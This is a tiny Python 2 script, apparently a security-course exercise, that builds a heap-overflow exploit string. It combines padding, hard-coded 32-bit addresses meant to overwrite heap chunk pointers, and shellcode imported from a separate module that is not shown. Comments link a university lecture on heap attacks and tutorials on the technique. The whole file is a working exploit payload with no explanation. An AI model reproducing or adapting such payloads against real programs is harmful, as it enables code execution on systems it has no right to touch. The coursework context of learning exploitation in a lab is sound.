from shellcode import shellcode
from struct import pack
print 'A'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'A'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" A"

#recitation
#http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
#https://www.win.tue.nl/~aeb/linux/hh/hh-11.html
#https://blog.csdn.net/qq_29343201/article/details/59614863
